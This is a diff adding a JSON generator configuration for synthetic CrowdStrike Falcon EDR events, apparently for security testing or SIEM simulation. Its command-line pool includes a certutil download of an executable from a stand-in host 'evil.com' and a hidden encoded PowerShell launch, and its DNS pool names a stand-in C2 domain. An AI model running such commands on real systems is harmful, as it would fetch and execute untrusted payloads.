@@ -1,0 +1,43 @@
+{
+  "sourcetype":"crowdstrike:falcon:event","vendor":"CrowdStrike","product":"Falcon","format":"json",
+  "description":"CrowdStrike Falcon EDR events",
+  "templatePrefix":"{\"metadata\":{\"customerIDString\":\"{{cid}}\",\"eventType\":\"{{etype}}\"},\"event\":{\"event_simpleName\":\"{{esn}}\",\"timestamp\":{{ts}},\"aid\":\"{{aid}}\",\"ComputerName\":\"{{host}}\",\"UserName\":\"{{usr}}\",",
+  "templateSuffix":"}}",
+  "fields":[
+    {"name":"ts","type":"timestamp","config":{"format":"epoch_ms","jitterMs":3000}},
+    {"name":"aid","type":"hash","config":{"algorithm":"random_hex","length":32}},
+    {"name":"cid","type":"string","config":{"pool":["a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4"]}},
+    {"name":"host","type":"hostname","config":{"pool":["WKS-FIN-PC07","WKS-IT-PC01","WKS-HR-PC03","SRV-DC01","SRV-FILE01","LAPTOP-A3B7C9D","SRV-SQL01"]}},
+    {"name":"dom","type":"string","config":{"pool":["CORP.CONTOSO.COM","CONTOSO.COM","WORKGROUP"]}},
+    {"name":"sevn","type":"enum","config":{"values":["Informational","Low","Medium","High","Critical"],"weights":[0.3,0.25,0.2,0.15,0.1]}},
+    {"name":"sev","type":"enum","config":{"values":[1,2,3,4,5],"weights":[0.3,0.25,0.2,0.15,0.1]}},
+    {"name":"usr","type":"username","config":{"pattern":"{first}.{last}"}},
+    {"name":"sha","type":"hash","config":{"algorithm":"sha256"}},
+    {"name":"fp","type":"path","config":{"pool":["\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\powershell.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\rundll32.exe","\\Device\\HarddiskVolume3\\Windows\\System32\\svchost.exe","\\Device\\HarddiskVolume3\\Windows\\explorer.exe"]}},
+    {"name":"cmd","type":"string","config":{"pool":["cmd.exe /c whoami /all","powershell.exe -nop -w hidden -enc SQBm","net user /domain","certutil.exe -urlcache -f http://evil.com/p.exe","svchost.exe -k netsvcs","explorer.exe"]}},
+    {"name":"ppid","type":"int","config":{"min":100,"max":65535}},
+    {"name":"tpid","type":"int","config":{"min":100,"max":65535}},
+    {"name":"lip","type":"ip","config":{"internal":[{"cidr":"10.0.0.0/8","weight":0.6},{"cidr":"192.168.0.0/16","weight":0.4}]}},
+    {"name":"rip","type":"ip","config":{"external":[{"cidr":"0.0.0.0/0","weight":1}]}},
+    {"name":"rpt","type":"port","config":{"common":[443,80,53,22,445,3389],"weights":[0.35,0.22,0.15,0.1,0.09,0.09]}}
+  ],
+  "variants":{
+    "detect":{"weight":0.20,
+      "fields":{"etype":"DetectionSummaryEvent","esn":"SuspiciousActivity","dn":{"type":"enum","config":{"values":["Suspicious PowerShell","Credential Dumping","Lateral Movement","Defense Evasion","Malicious Script","Registry Persistence","Ransomware"],"weights":[0.22,0.16,0.14,0.14,0.13,0.12,0.09]}},"tac":{"type":"enum","config":{"values":["Execution","CredentialAccess","LateralMovement","DefenseEvasion","Persistence","Discovery","C2"],"weights":[0.2,0.16,0.14,0.14,0.14,0.12,0.1]}},"tech":{"type":"enum","config":{"values":["T1059.001","T1003.001","T1021.002","T1218.011","T1547.001","T1082","T1071.001"],"weights":[0.2,0.16,0.14,0.14,0.14,0.12,0.1]}}},
+      "bodyTemplate":"\"DetectName\":\"{{dn}}\",\"SeverityName\":\"{{sevn}}\",\"Severity\":{{sev}},\"Tactic\":\"{{tac}}\",\"Technique\":\"{{tech}}\",\"FilePath\":\"{{fp}}\",\"CommandLine\":\"{{cmd}}\",\"SHA256HashData\":\"{{sha}}\""},
+    "proc":{"weight":0.30,
+      "fields":{"etype":"ProcessRollup2","esn":"ProcessRollup2"},
+      "bodyTemplate":"\"FilePath\":\"{{fp}}\",\"CommandLine\":\"{{cmd}}\",\"SHA256HashData\":\"{{sha}}\",\"ParentProcessId\":{{ppid}},\"TargetProcessId\":{{tpid}}"},
+    "net":{"weight":0.20,
+      "fields":{"etype":"NetworkConnectIP4","esn":"NetworkConnectIP4","dir":{"type":"enum","config":{"values":["0","1"],"weights":[0.4,0.6]}},"proto":{"type":"enum","config":{"values":["6","17"],"weights":[0.8,0.2]}}},
+      "bodyTemplate":"\"LocalIP\":\"{{lip}}\",\"RemoteIP\":\"{{rip}}\",\"RemotePort\":{{rpt}},\"ConnectionDirection\":\"{{dir}}\",\"Protocol\":\"{{proto}}\""},
+    "dns":{"weight":0.15,
+      "fields":{"etype":"DnsRequest","esn":"DnsRequest","qn":{"type":"string","config":{"pool":["login.microsoftonline.com","www.google.com","api.github.com","zoom.us","outlook.office365.com","evil-c2.xyz","s3.amazonaws.com"]}},"rt":{"type":"enum","config":{"values":["A","AAAA","CNAME"],"weights":[0.6,0.25,0.15]}}},
+      "bodyTemplate":"\"DomainName\":\"{{qn}}\",\"RequestType\":\"{{rt}}\""},
+    "logon":{"weight":0.15,
+      "fields":{"etype":"UserLogon","esn":"UserLogon","lt":{"type":"enum","config":{"values":["Interactive","Network","RemoteInteractive","Service"],"weights":[0.35,0.3,0.2,0.15]}}},
+      "bodyTemplate":"\"LogonType\":\"{{lt}}\",\"MachineDomain\":\"{{dom}}\""}
+  },
+  "template":"{{templatePrefix}}{{bodyTemplate}}{{templateSuffix}}",
+  "correlationHints":{"actor_user":"usr","actor_host":"host","actor_ip":"lip","target_ip":"rip"}
+}
